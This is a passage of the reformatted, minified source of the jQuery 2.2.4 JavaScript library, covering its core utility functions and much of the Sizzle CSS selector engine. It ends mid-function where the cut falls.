/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */
!(function (t, e) {
  "object" == typeof module && "object" == typeof module.exports
    ? (module.exports = t.document
        ? e(t, !0)
        : function (t) {
            if (!t.document)
              throw new Error("jQuery requires a window with a document");
            return e(t);
          })
    : e(t);
})("undefined" != typeof window ? window : this, function (t, e) {
  var i = [],
    n = t.document,
    s = i.slice,
    o = i.concat,
    r = i.push,
    a = i.indexOf,
    l = {},
    c = l.toString,
    u = l.hasOwnProperty,
    d = {},
    h = "2.2.4",
    p = function (t, e) {
      return new p.fn.init(t, e);
    },
    f = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
    g = /^-ms-/,
    m = /-([\da-z])/gi,
    v = function (t, e) {
      return e.toUpperCase();
    };
  function y(t) {
    var e = !!t && "length" in t && t.length,
      i = p.type(t);
    return (
      "function" !== i &&
      !p.isWindow(t) &&
      ("array" === i ||
        0 === e ||
        ("number" == typeof e && e > 0 && e - 1 in t))
    );
  }
  (p.fn = p.prototype =
    {
      jquery: h,
      constructor: p,
      selector: "",
      length: 0,
      toArray: function () {
        return s.call(this);
      },
      get: function (t) {
        return null != t
          ? 0 > t
            ? this[t + this.length]
            : this[t]
          : s.call(this);
      },
      pushStack: function (t) {
        var e = p.merge(this.constructor(), t);
        return (e.prevObject = this), (e.context = this.context), e;
      },
      each: function (t) {
        return p.each(this, t);
      },
      map: function (t) {
        return this.pushStack(
          p.map(this, function (e, i) {
            return t.call(e, i, e);
          })
        );
      },
      slice: function () {
        return this.pushStack(s.apply(this, arguments));
      },
      first: function () {
        return this.eq(0);
      },
      last: function () {
        return this.eq(-1);
      },
      eq: function (t) {
        var e = this.length,
          i = +t + (0 > t ? e : 0);
        return this.pushStack(i >= 0 && e > i ? [this[i]] : []);
      },
      end: function () {
        return this.prevObject || this.constructor();
      },
      push: r,
      sort: i.sort,
      splice: i.splice,
    }),
    (p.extend = p.fn.extend =
      function () {
        var t,
          e,
          i,
          n,
          s,
          o,
          r = arguments[0] || {},
          a = 1,
          l = arguments.length,
          c = !1;
        for (
          "boolean" == typeof r && ((c = r), (r = arguments[a] || {}), a++),
            "object" == typeof r || p.isFunction(r) || (r = {}),
            a === l && ((r = this), a--);
          l > a;
          a++
        )
          if (null != (t = arguments[a]))
            for (e in t)
              (i = r[e]),
                r !== (n = t[e]) &&
                  (c && n && (p.isPlainObject(n) || (s = p.isArray(n)))
                    ? (s
                        ? ((s = !1), (o = i && p.isArray(i) ? i : []))
                        : (o = i && p.isPlainObject(i) ? i : {}),
                      (r[e] = p.extend(c, o, n)))
                    : void 0 !== n && (r[e] = n));
        return r;
      }),
    p.extend({
      expando: "jQuery" + (h + Math.random()).replace(/\D/g, ""),
      isReady: !0,
      error: function (t) {
        throw new Error(t);
      },
      noop: function () {},
      isFunction: function (t) {
        return "function" === p.type(t);
      },
      isArray: Array.isArray,
      isWindow: function (t) {
        return null != t && t === t.window;
      },
      isNumeric: function (t) {
        var e = t && t.toString();
        return !p.isArray(t) && e - parseFloat(e) + 1 >= 0;
      },
      isPlainObject: function (t) {
        var e;
        if ("object" !== p.type(t) || t.nodeType || p.isWindow(t)) return !1;
        if (
          t.constructor &&
          !u.call(t, "constructor") &&
          !u.call(t.constructor.prototype || {}, "isPrototypeOf")
        )
          return !1;
        for (e in t);
        return void 0 === e || u.call(t, e);
      },
      isEmptyObject: function (t) {
        var e;
        for (e in t) return !1;
        return !0;
      },
      type: function (t) {
        return null == t
          ? t + ""
          : "object" == typeof t || "function" == typeof t
          ? l[c.call(t)] || "object"
          : typeof t;
      },
      globalEval: function (t) {
        var e,
          i = eval;
        (t = p.trim(t)) &&
          (1 === t.indexOf("use strict")
            ? (((e = n.createElement("script")).text = t),
              n.head.appendChild(e).parentNode.removeChild(e))
            : i(t));
      },
      camelCase: function (t) {
        return t.replace(g, "ms-").replace(m, v);
      },
      nodeName: function (t, e) {
        return t.nodeName && t.nodeName.toLowerCase() === e.toLowerCase();
      },
      each: function (t, e) {
        var i,
          n = 0;
        if (y(t))
          for (i = t.length; i > n && !1 !== e.call(t[n], n, t[n]); n++);
        else for (n in t) if (!1 === e.call(t[n], n, t[n])) break;
        return t;
      },
      trim: function (t) {
        return null == t ? "" : (t + "").replace(f, "");
      },
      makeArray: function (t, e) {
        var i = e || [];
        return (
          null != t &&
            (y(Object(t))
              ? p.merge(i, "string" == typeof t ? [t] : t)
              : r.call(i, t)),
          i
        );
      },
      inArray: function (t, e, i) {
        return null == e ? -1 : a.call(e, t, i);
      },
      merge: function (t, e) {
        for (var i = +e.length, n = 0, s = t.length; i > n; n++) t[s++] = e[n];
        return (t.length = s), t;
      },
      grep: function (t, e, i) {
        for (var n = [], s = 0, o = t.length, r = !i; o > s; s++)
          !e(t[s], s) !== r && n.push(t[s]);
        return n;
      },
      map: function (t, e, i) {
        var n,
          s,
          r = 0,
          a = [];
        if (y(t))
          for (n = t.length; n > r; r++)
            null != (s = e(t[r], r, i)) && a.push(s);
        else for (r in t) null != (s = e(t[r], r, i)) && a.push(s);
        return o.apply([], a);
      },
      guid: 1,
      proxy: function (t, e) {
        var i, n, o;
        return (
          "string" == typeof e && ((i = t[e]), (e = t), (t = i)),
          p.isFunction(t)
            ? ((n = s.call(arguments, 2)),
              ((o = function () {
                return t.apply(e || this, n.concat(s.call(arguments)));
              }).guid = t.guid =
                t.guid || p.guid++),
              o)
            : void 0
        );
      },
      now: Date.now,
      support: d,
    }),
    "function" == typeof Symbol && (p.fn[Symbol.iterator] = i[Symbol.iterator]),
    p.each(
      "Boolean Number String Function Array Date RegExp Object Error Symbol".split(
        " "
      ),
      function (t, e) {
        l["[object " + e + "]"] = e.toLowerCase();
      }
    );
  var _ = (function (t) {
    var e,
      i,
      n,
      s,
      o,
      r,
      a,
      l,
      c,
      u,
      d,
      h,
      p,
      f,
      g,
      m,
      v,
      y,
      _,
      w = "sizzle" + 1 * new Date(),
      b = t.document,
      C = 0,
      x = 0,
      T = ot(),
      k = ot(),
      S = ot(),
      E = function (t, e) {
        return t === e && (d = !0), 0;
      },
      A = 1 << 31,
      D = {}.hasOwnProperty,
      I = [],
      $ = I.pop,
      O = I.push,
      N = I.push,
      P = I.slice,
      M = function (t, e) {
        for (var i = 0, n = t.length; n > i; i++) if (t[i] === e) return i;
        return -1;
      },
      j =
        "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      H = "[\\x20\\t\\r\\n\\f]",
      L = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
      z =
        "\\[" +
        H +
        "*(" +
        L +
        ")(?:" +
        H +
        "*([*^$|!~]?=)" +
        H +
        "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" +
        L +
        "))|)" +
        H +
        "*\\]",
      W =
        ":(" +
        L +
        ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" +
        z +
        ")*)|.*)\\)|)",
      F = new RegExp(H + "+", "g"),
      R = new RegExp("^" + H + "+|((?:^|[^\\\\])(?:\\\\.)*)" + H + "+$", "g"),
      q = new RegExp("^" + H + "*," + H + "*"),
      B = new RegExp("^" + H + "*([>+~]|" + H + ")" + H + "*"),
      U = new RegExp("=" + H + "*([^\\]'\"]*?)" + H + "*\\]", "g"),
      V = new RegExp(W),
      Q = new RegExp("^" + L + "$"),
      Y = {
        ID: new RegExp("^#(" + L + ")"),
        CLASS: new RegExp("^\\.(" + L + ")"),
        TAG: new RegExp("^(" + L + "|[*])"),
        ATTR: new RegExp("^" + z),
        PSEUDO: new RegExp("^" + W),
        CHILD: new RegExp(
          "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
            H +
            "*(even|odd|(([+-]|)(\\d*)n|)" +
            H +
            "*(?:([+-]|)" +
            H +
            "*(\\d+)|))" +
            H +
            "*\\)|)",
          "i"
        ),
        bool: new RegExp("^(?:" + j + ")$", "i"),
        needsContext: new RegExp(
          "^" +
            H +
            "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" +
            H +
            "*((?:-\\d)?\\d*)" +
            H +
            "*\\)|)(?=[^-]|$)",
          "i"
        ),
      },
      K = /^(?:input|select|textarea|button)$/i,
      X = /^h\d$/i,
      Z = /^[^{]+\{\s*\[native \w/,
      G = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      J = /[+~]/,
      tt = /'|\\/g,
      et = new RegExp("\\\\([\\da-f]{1,6}" + H + "?|(" + H + ")|.)", "ig"),
      it = function (t, e, i) {
        var n = "0x" + e - 65536;
        return n != n || i
          ? e
          : 0 > n
          ? String.fromCharCode(n + 65536)
          : String.fromCharCode((n >> 10) | 55296, (1023 & n) | 56320);
      },
      nt = function () {
        h();
      };
    try {
      N.apply((I = P.call(b.childNodes)), b.childNodes),
        I[b.childNodes.length].nodeType;
    } catch (t) {
      N = {
        apply: I.length
          ? function (t, e) {
              O.apply(t, P.call(e));
            }
          : function (t, e) {
              for (var i = t.length, n = 0; (t[i++] = e[n++]); );
              t.length = i - 1;
            },
      };
    }
    function st(t, e, n, s) {
      var o,
        a,
        c,
        u,
        d,
        f,
        v,
        y,
        C = e && e.ownerDocument,
        x = e ? e.nodeType : 9;
      if (
        ((n = n || []),
        "string" != typeof t || !t || (1 !== x && 9 !== x && 11 !== x))
      )
        return n;
      if (
        !s &&
        ((e ? e.ownerDocument || e : b) !== p && h(e), (e = e || p), g)
      ) {
        if (11 !== x && (f = G.exec(t)))
          if ((o = f[1])) {
            if (9 === x) {
              if (!(c = e.getElementById(o))) return n;
              if (c.id === o) return n.push(c), n;
            } else if (C && (c = C.getElementById(o)) && _(e, c) && c.id === o)
              return n.push(c), n;
          } else {
            if (f[2]) return N.apply(n, e.getElementsByTagName(t)), n;
            if (
              (o = f[3]) &&
              i.getElementsByClassName &&
              e.getElementsByClassName
            )
              return N.apply(n, e.getElementsByClassName(o)), n;
          }
        if (i.qsa && !S[t + " "] && (!m || !m.test(t))) {
          if (1 !== x) (C = e), (y = t);
          else if ("object" !== e.nodeName.toLowerCase()) {
            for (
              (u = e.getAttribute("id"))
                ? (u = u.replace(tt, "\\$&"))
                : e.setAttribute("id", (u = w)),
                a = (v = r(t)).length,
                d = Q.test(u) ? "#" + u : "[id='" + u + "']";
              a--;

            )
              v[a] = d + " " + gt(v[a]);
            (y = v.join(",")), (C = (J.test(t) && pt(e.parentNode)) || e);
          }
          if (y)
            try {
              return N.apply(n, C.querySelectorAll(y)), n;
            } catch (t) {
            } finally {
              u === w && e.removeAttribute("id");
            }
        }
      }
      return l(t.replace(R, "$1"), e, n, s);
    }
    function ot() {
      var t = [];
      return function e(i, s) {
        return (
          t.push(i + " ") > n.cacheLength && delete e[t.shift()],
          (e[i + " "] = s)
        );
      };
    }
    function rt(t) {
      return (t[w] = !0), t;
    }
    function at(t) {
      var e = p.createElement("div");
      try {
        return !!t(e);
      } catch (t) {
        return !1;
      } finally {
        e.parentNode && e.parentNode.removeChild(e), (e = null);
      }
    }
    function lt(t, e) {
      for (var i = t.split("|"), s = i.length; s--; ) n.attrHandle[i[s]] = e;
    }
    function ct(t, e) {
      var i = e && t,
        n =
          i &&
          1 === t.nodeType &&
          1 === e.nodeType &&
          (~e.sourceIndex || A) - (~t.sourceIndex || A);
      if (n) return n;
      if (i) for (; (i = i.nextSibling); ) if (i === e) return -1;
      return t ? 1 : -1;
    }
    function ut(t) {
      return function (e) {
        return "input" === e.nodeName.toLowerCase() && e.type === t;
      };
    }
    function dt(t) {
      return function (e) {
        var i = e.nodeName.toLowerCase();
        return ("input" === i || "button" === i) && e.type === t;
      };
    }
    function ht(t) {
      return rt(function (e) {
        return (
          (e = +e),
          rt(function (i, n) {
            for (var s, o = t([], i.length, e), r = o.length; r--; )
              i[(s = o[r])] && (i[s] = !(n[s] = i[s]));
          })
        );
      });
    }
    function pt(t) {
      return t && void 0 !== t.getElementsByTagName && t;
    }
    for (e in ((i = st.support = {}),
    (o = st.isXML =
      function (t) {
        var e = t && (t.ownerDocument || t).documentElement;
        return !!e && "HTML" !== e.nodeName;
      }),
    (h = st.setDocument =
      function (t) {
        var e,
          s,
          r = t ? t.ownerDocument || t : b;
        return r !== p && 9 === r.nodeType && r.documentElement
          ? ((f = (p = r).documentElement),
            (g = !o(p)),
            (s = p.defaultView) &&
              s.top !== s &&
              (s.addEventListener
                ? s.addEventListener("unload", nt, !1)
                : s.attachEvent && s.attachEvent("onunload", nt)),
            (i.attributes = at(function (t) {
              return (t.className = "i"), !t.getAttribute("className");
            })),
            (i.getElementsByTagName = at(function (t) {
              return (
                t.appendChild(p.createComment("")),
                !t.getElementsByTagName("*").length
              );
            })),
            (i.getElementsByClassName = Z.test(p.getElementsByClassName)),
            (i.getById = at(function (t) {
              return (
                (f.appendChild(t).id = w),
                !p.getElementsByName || !p.getElementsByName(w).length
              );
            })),
            i.getById
              ? ((n.find.ID = function (t, e) {
                  if (void 0 !== e.getElementById && g) {
                    var i = e.getElementById(t);
                    return i ? [i] : [];
                  }
                }),
                (n.filter.ID = function (t) {
                  var e = t.replace(et, it);
                  return function (t) {
                    return t.getAttribute("id") === e;
                  };
                }))
              : (delete n.find.ID,
                (n.filter.ID = function (t) {
                  var e = t.replace(et, it);
                  return function (t) {
                    var i =
                      void 0 !== t.getAttributeNode && t.getAttributeNode("id");
                    return i && i.value === e;
                  };
                })),
            (n.find.TAG = i.getElementsByTagName
              ? function (t, e) {
                  return void 0 !== e.getElementsByTagName
                    ? e.getElementsByTagName(t)
                    : i.qsa
                    ? e.querySelectorAll(t)
                    : void 0;
                }
              : function (t, e) {
                  var i,
                    n = [],
                    s = 0,
                    o = e.getElementsByTagName(t);
                  if ("*" === t) {
                    for (; (i = o[s++]); ) 1 === i.nodeType && n.push(i);
                    return n;
                  }
                  return o;
                }),
            (n.find.CLASS =
              i.getElementsByClassName &&
              function (t, e) {
                return void 0 !== e.getElementsByClassName && g
                  ? e.getElementsByClassName(t)
                  : void 0;
              }),
            (v = []),
            (m = []),
            (i.qsa = Z.test(p.querySelectorAll)) &&
              (at(function (t) {
                (f.appendChild(t).innerHTML =
                  "<a id='" +
                  w +
                  "'></a><select id='" +
                  w +
                  "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                  t.querySelectorAll("[msallowcapture^='']").length &&
                    m.push("[*^$]=" + H + "*(?:''|\"\")"),
                  t.querySelectorAll("[selected]").length ||
                    m.push("\\[" + H + "*(?:value|" + j + ")"),
                  t.querySelectorAll("[id~=" + w + "-]").length || m.push("~="),
                  t.querySelectorAll(":checked").length || m.push(":checked"),
                  t.querySelectorAll("a#" + w + "+*").length ||
                    m.push(".#.+[+~]");
              }),
              at(function (t) {
                var e = p.createElement("input");
                e.setAttribute("type", "hidden"),
                  t.appendChild(e).setAttribute("name", "D"),
                  t.querySelectorAll("[name=d]").length &&
                    m.push("name" + H + "*[*^$|!~]?="),
                  t.querySelectorAll(":enabled").length ||
                    m.push(":enabled", ":disabled"),
                  t.querySelectorAll("*,:x"),
                  m.push(",.*:");
              })),
            (i.matchesSelector = Z.test(
              (y =
                f.matches ||
                f.webkitMatchesSelector ||
                f.mozMatchesSelector ||
                f.oMatchesSelector ||
                f.msMatchesSelector)
            )) &&
              at(function (t) {
                (i.disconnectedMatch = y.call(t, "div")),
                  y.call(t, "[s!='']:x"),
                  v.push("!=", W);
              }),
            (m = m.length && new RegExp(m.join("|"))),
            (v = v.length && new RegExp(v.join("|"))),
            (e = Z.test(f.compareDocumentPosition)),
            (_ =
              e || Z.test(f.contains)
                ? function (t, e) {
                    var i = 9 === t.nodeType ? t.documentElement : t,
                      n = e && e.parentNode;
                    return (
                      t === n ||
                      !(
                        !n ||
                        1 !== n.nodeType ||
                        !(i.contains
                          ? i.contains(n)
                          : t.compareDocumentPosition &&
                            16 & t.compareDocumentPosition(n))
                      )
                    );
                  }
                : function (t, e) {
                    if (e) for (; (e = e.parentNode); ) if (e === t) return !0;
                    return !1;
                  }),
            (E = e
              ? function (t, e) {
                  if (t === e) return (d = !0), 0;
                  var n =
                    !t.compareDocumentPosition - !e.compareDocumentPosition;
                  return (
                    n ||
                    (1 &
                      (n =
                        (t.ownerDocument || t) === (e.ownerDocument || e)
                          ? t.compareDocumentPosition(e)
                          : 1) ||
                    (!i.sortDetached && e.compareDocumentPosition(t) === n)
                      ? t === p || (t.ownerDocument === b && _(b, t))
                        ? -1
                        : e === p || (e.ownerDocument === b && _(b, e))
                        ? 1
                        : u
                        ? M(u, t) - M(u, e)
                        : 0
                      : 4 & n
                      ? -1
                      : 1)
                  );
                }
              : function (t, e) {
                  if (t === e) return (d = !0), 0;
                  var i,
                    n = 0,
                    s = t.parentNode,
                    o = e.parentNode,
                    r = [t],
                    a = [e];
                  if (!s || !o)
                    return t === p
                      ? -1
                      : e === p
                      ? 1
                      : s
                      ? -1
                      : o
                      ? 1
                      : u
                      ? M(u, t) - M(u, e)
                      : 0;
                  if (s === o) return ct(t, e);
                  for (i = t; (i = i.parentNode); ) r.unshift(i);
                  for (i = e; (i = i.parentNode); ) a.unshift(i);
                  for (; r[n] === a[n]; ) n++;
                  return n
                    ? ct(r[n], a[n])
                    : r[n] === b
                    ? -1
                    : a[n] === b
                    ? 1
                    : 0;
                }),
            p)
          : p;
      }),
    (st.matches = function (t, e) {
      return st(t, null, null, e);
    }),
    (st.matchesSelector = function (t, e) {
      if (
        ((t.ownerDocument || t) !== p && h(t),
        (e = e.replace(U, "='$1']")),
        i.matchesSelector &&
          g &&
          !S[e + " "] &&
          (!v || !v.test(e)) &&
          (!m || !m.test(e)))
      )
        try {
          var n = y.call(t, e);
          if (
            n ||
            i.disconnectedMatch ||
            (t.document && 11 !== t.document.nodeType)
          )
            return n;
        } catch (t) {}
      return st(e, p, null, [t]).length > 0;
    }),
    (st.contains = function (t, e) {
      return (t.ownerDocument || t) !== p && h(t), _(t, e);
    }),
    (st.attr = function (t, e) {
      (t.ownerDocument || t) !== p && h(t);
      var s = n.attrHandle[e.toLowerCase()],
        o = s && D.call(n.attrHandle, e.toLowerCase()) ? s(t, e, !g) : void 0;
      return void 0 !== o
        ? o
        : i.attributes || !g
        ? t.getAttribute(e)
        : (o = t.getAttributeNode(e)) && o.specified
        ? o.value
        : null;
    }),
    (st.error = function (t) {
      throw new Error("Syntax error, unrecognized expression: " + t);
    }),
    (st.uniqueSort = function (t) {
      var e,
        n = [],
        s = 0,
        o = 0;
      if (
        ((d = !i.detectDuplicates),
        (u = !i.sortStable && t.slice(0)),
        t.sort(E),
        d)
      ) {
        for (; (e = t[o++]); ) e === t[o] && (s = n.push(o));
        for (; s--; ) t.splice(n[s], 1);
      }
      return (u = null), t;
    }),
    (s = st.getText =
      function (t) {
        var e,
          i = "",
          n = 0,
          o = t.nodeType;
        if (o) {
          if (1 === o || 9 === o || 11 === o) {
            if ("string" == typeof t.textContent) return t.textContent;
            for (t = t.firstChild; t; t = t.nextSibling) i += s(t);
          } else if (3 === o || 4 === o) return t.nodeValue;
        } else for (; (e = t[n++]); ) i += s(e);
        return i;
      }),
    ((n = st.selectors =
      {
        cacheLength: 50,
        createPseudo: rt,
        match: Y,
        attrHandle: {},
        find: {},
        relative: {
          ">": { dir: "parentNode", first: !0 },
          " ": { dir: "parentNode" },
          "+": { dir: "previousSibling", first: !0 },
          "~": { dir: "previousSibling" },
        },
        preFilter: {
          ATTR: function (t) {
            return (
              (t[1] = t[1].replace(et, it)),
              (t[3] = (t[3] || t[4] || t[5] || "").replace(et, it)),
              "~=" === t[2] && (t[3] = " " + t[3] + " "),
              t.slice(0, 4)
            );
          },
          CHILD: function (t) {
            return (
              (t[1] = t[1].toLowerCase()),
              "nth" === t[1].slice(0, 3)
                ? (t[3] || st.error(t[0]),
                  (t[4] = +(t[4]
                    ? t[5] + (t[6] || 1)
                    : 2 * ("even" === t[3] || "odd" === t[3]))),
                  (t[5] = +(t[7] + t[8] || "odd" === t[3])))
                : t[3] && st.error(t[0]),
              t
            );
          },
          PSEUDO: function (t) {
            var e,
              i = !t[6] && t[2];
            return Y.CHILD.test(t[0])
              ? null
              : (t[3]
                  ? (t[2] = t[4] || t[5] || "")
                  : i &&
                    V.test(i) &&
                    (e = r(i, !0)) &&
                    (e = i.indexOf(")", i.length - e) - i.length) &&
                    ((t[0] = t[0].slice(0, e)), (t[2] = i.slice(0, e))),
                t.slice(0, 3));
          },
        },
        filter: {
          TAG: function (t) {
            var e = t.replace(et, it).toLowerCase();
            return "*" === t
              ? function () {
                  return !0;
                }
              : function (t) {
                  return t.nodeName && t.nodeName.toLowerCase() === e;
                };
          },
          CLASS: function (t) {
            var e = T[t + " "];
            return (
              e ||
              ((e = new RegExp("(^|" + H + ")" + t + "(" + H + "|$)")) &&
                T(t, function (t) {
                  return e.test(
                    ("string" == typeof t.className && t.className) ||
                      (void 0 !== t.getAttribute && t.getAttribute("class")) ||
                      ""
                  );
                }))
            );
          },
          ATTR: function (t, e, i) {
            return function (n) {
              var s = st.attr(n, t);
              return null == s
                ? "!=" === e
                : !e ||
                    ((s += ""),
                    "=" === e
                      ? s === i
                      : "!=" === e
                      ? s !== i
                      : "^=" === e
                      ? i && 0 === s.indexOf(i)
                      : "*=" === e
                      ? i && s.indexOf(i) > -1
                      : "$=" === e
                      ? i && s.slice(-i.length) === i
                      : "~=" === e
                      ? (" " + s.replace(F, " ") + " ").indexOf(i) > -1
                      : "|=" === e &&
                        (s === i || s.slice(0, i.length + 1) === i + "-"));
            };
          },
          CHILD: function (t, e, i, n, s) {
            var o = "nth" !== t.slice(0, 3),
              r = "last" !== t.slice(-4),
              a = "of-type" === e;
            return 1 === n && 0 === s
              ? function (t) {
                  return !!t.parentNode;
                }
              : function (e, i, l) {
                  var c,
                    u,
                    d,
                    h,
                    p,
                    f,
                    g = o !== r ? "nextSibling" : "previousSibling",
                    m = e.parentNode,
                    v = a && e.nodeName.toLowerCase(),
                    y = !l && !a,
                    _ = !1;
                  if (m) {
                    if (o) {
                      for (; g; ) {
                        for (h = e; (h = h[g]); )
                          if (
                            a
                              ? h.nodeName.toLowerCase() === v
                              : 1 === h.nodeType
                          )
                            return !1;
                        f = g = "only" === t && !f && "nextSibling";
                      }
                      return !0;
                    }
                    if (((f = [r ? m.firstChild : m.lastChild]), r && y)) {
                      for (
                        _ =
                          (p =
                            (c =
                              (u =
                                (d = (h = m)[w] || (h[w] = {}))[h.uniqueID] ||
                                (d[h.uniqueID] = {}))[t] || [])[0] === C &&
                            c[1]) && c[2],
                          h = p && m.childNodes[p];
                        (h = (++p && h && h[g]) || (_ = p = 0) || f.pop());

                      )
                        if (1 === h.nodeType && ++_ && h === e) {
                          u[t] = [C, p, _];
                          break;
                        }
                    } else if (
                      (y &&
                        (_ = p =
                          (c =
                            (u =
                              (d = (h = e)[w] || (h[w] = {}))[h.uniqueID] ||
                              (d[h.uniqueID] = {}))[t] || [])[0] === C && c[1]),
                      !1 === _)
                    )
                      for (
                        ;
                        (h = (++p && h && h[g]) || (_ = p = 0) || f.pop()) &&
                        ((a
                          ? h.nodeName.toLowerCase() !== v
                          : 1 !== h.nodeType) ||
                          !++_ ||
                          (y &&
                            ((u =
                              (d = h[w] || (h[w] = {}))[h.uniqueID] ||
                              (d[h.uniqueID] = {}))[t] = [C, _]),
                          h !== e));

                      );
                    return (_ -= s) === n || (_ % n == 0 && _ / n >= 0);
                  }
                };
          },
          PSEUDO: function (t, e) {
            var i,
              s =
                n.pseudos[t] ||
                n.setFilters[t.toLowerCase()] ||
                st.error("unsupported pseudo: " + t);
            return s[w]
              ? s(e)
              : s.length > 1
              ? ((i = [t, t, "", e]),
                n.setFilters.hasOwnProperty(t.toLowerCase())
                  ? rt(function (t, i) {
                      for (var n, o = s(t, e), r = o.length; r--; )
                        t[(n = M(t, o[r]))] = !(i[n] = o[r]);
                    })
                  : function (t) {
                      return s(t, 0, i);
                    })
              : s;
          },
        },
        pseudos: {
          not: rt(function (t) {
            var e = [],
              i = [],
              n = a(t.replace(R, "$1"));
            return n[w]
              ? rt(function (t, e, i, s) {
                  for (var o, r = n(t, null, s, []), a = t.length; a--; )
                    (o = r[a]) && (t[a] = !(e[a] = o));
                })
              : function (t, s, o) {
                  return (e[0] = t), n(e, null, o, i), (e[0] = null), !i.pop();
                };
          }),
          has: rt(function (t) {
            return function (e) {
              return st(t, e).length > 0;
            };
          }),
          contains: rt(function (t) {
            return (
              (t = t.replace(et, it)),
              function (e) {
                return (e.textContent || e.innerText || s(e)).indexOf(t) > -1;
              }
            );
          }),
          lang: rt(function (t) {
            return (
              Q.test(t || "") || st.error("unsupported lang: " + t),
              (t = t.replace(et, it).toLowerCase()),
              function (e) {
                var i;
                do {
                  if (
                    (i = g
                      ? e.lang
                      : e.getAttribute("xml:lang") || e.getAttribute("lang"))
                  )
                    return (
                      (i = i.toLowerCase()) === t || 0 === i.indexOf(t + "-")
                    );
                } while ((e = e.parentNode) && 1 === e.nodeType);
                return !1;
              }
            );
          }),
          target: function (e) {
            var i = t.location && t.location.hash;
            return i && i.slice(1) === e.id;
          },
          root: function (t) {
            return t === f;
          },
          focus: function (t) {
            return (
              t === p.activeElement &&
              (!p.hasFocus || p.hasFocus()) &&
              !!(t.type || t.href || ~t.tabIndex)
            );
          },
          enabled: function (t) {
            return !1 === t.disabled;
          },
          disabled: function (t) {
            return !0 === t.disabled;
          },
          checked: function (t) {
            var e = t.nodeName.toLowerCase();
            return (
              ("input" === e && !!t.checked) || ("option" === e && !!t.selected)
            );
          },
          selected: function (t) {
            return (
              t.parentNode && t.parentNode.selectedIndex, !0 === t.selected
            );
          },
          empty: function (t) {
            for (t = t.firstChild; t; t = t.nextSibling)
              if (t.nodeType < 6) return !1;
            return !0;
          },
          parent: function (t) {
            return !n.pseudos.empty(t);
          },
          header: function (t) {
            return X.test(t.nodeName);
          },
          input: function (t) {
            return K.test(t.nodeName);
          },
          button: function (t) {
            var e = t.nodeName.toLowerCase();
            return ("input" === e && "button" === t.type) || "button" === e;
          },
          text: function (t) {
            var e;
            return (
              "input" === t.nodeName.toLowerCase() &&
              "text" === t.type &&
              (null == (e = t.getAttribute("type")) ||
                "text" === e.toLowerCase())
            );
          },
          first: ht(function () {
            return [0];
          }),
          last: ht(function (t, e) {
            return [e - 1];
          }),
          eq: ht(function (t, e, i) {
            return [0 > i ? i + e : i];
          }),
          even: ht(function (t, e) {
            for (var i = 0; e > i; i += 2) t.push(i);
            return t;
          }),
          odd: ht(function (t, e) {
            for (var i = 1; e > i; i += 2) t.push(i);
            return t;
          }),
          lt: ht(function (t, e, i) {
            for (var n = 0 > i ? i + e : i; --n >= 0; ) t.push(n);
            return t;
          }),
          gt: ht(function (t, e, i) {
            for (var n = 0 > i ? i + e : i; ++n < e; ) t.push(n);
            return t;
          }),
        },
      }).pseudos.nth = n.pseudos.eq),
    { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
      n.pseudos[e] = ut(e);
    for (e in { submit: !0, reset: !0 }) n.pseudos[e] = dt(e);
    function ft() {}
    function gt(t) {
      for (var e = 0, i = t.length, n = ""; i > e; e++) n += t[e].value;
      return n;
    }
    function mt(t, e, i) {
      var n = e.dir,
        s = i && "parentNode" === n,
        o = x++;
      return e.first
        ? function (e, i, o) {
            for (; (e = e[n]); ) if (1 === e.nodeType || s) return t(e, i, o);
          }
        : function (e, i, r) {
            var a,
              l,
              c,
              u = [C, o];
            if (r) {
              for (; (e = e[n]); )
                if ((1 === e.nodeType || s) && t(e, i, r)) return !0;
            } else
              for (; (e = e[n]); )
                if (1 === e.nodeType || s) {
                  if (
                    (a = (l =
                      (c = e[w] || (e[w] = {}))[e.uniqueID] ||
                      (c[e.uniqueID] = {}))[n]) &&
                    a[0] === C &&
                    a[1] === o
                  )
                    return (u[2] = a[2]);
                  if (((l[n] = u), (u[2] = t(e, i, r)))) return !0;
                }
          };
    }
    function vt(t) {
      return t.length > 1
        ? function (e, i, n) {
            for (var s = t.length; s--; ) if (!t[s](e, i, n)) return !1;
            return !0;
          }
        : t[0];
    }
    function yt(t, e, i, n, s) {
      for (var o, r = [], a = 0, l = t.length, c = null != e; l > a; a++)
        (o = t[a]) && ((i && !i(o, n, s)) || (r.push(o), c && e.push(a)));
      return r;
    }
    function _t(t, e, i, n, s, o) {
      return (
        n && !n[w] && (n = _t(n)),
        s && !s[w] && (s = _t(s, o)),
        rt(function (o, r, a, l) {
          var c,
            u,
            d,
            h = [],
            p = [],
            f = r.length,
            g =
              o ||
              (function (t, e, i) {
                for (var n = 0, s = e.length; s > n; n++) st(t, e[n], i);
                return i;
              })(e || "*", a.nodeType ? [a] : a, []),
            m = !t || (!o && e) ? g : yt(g, h, t, a, l),
            v = i ? (s || (o ? t : f || n) ? [] : r) : m;
          if ((i && i(m, v, a, l), n))
            for (c = yt(v, p), n(c, [], a, l), u = c.length; u--; )
              (d = c[u]) && (v[p[u]] = !(m[p[u]] = d));
          if (o) {
            if (s || t) {
              if (s) {
                for (c = [], u = v.length; u--; )
                  (d = v[u]) && c.push((m[u] = d));
                s(null, (v = []), c, l);
              }
              for (u = v.length; u--; )
                (d = v[u]) &&
                  (c = s ? M(o, d) : h[u]) > -1 &&
                  (o[c] = !(r[c] = d));
            }
          } else (v = yt(v === r ? v.splice(f, v.length) : v)), s ? s(null, r, v, l) : N.apply(r, v);
        })
      );
    }
    function wt(t) {
      for (
        var e,
          i,
          s,
          o = t.length,
          r = n.relative[t[0].type],
          a = r || n.relative[" "],
          l = r ? 1 : 0,
          u = mt(
            function (t) {
              return t === e;
            },
            a,
            !0
          ),
          d = mt(
            function (t) {
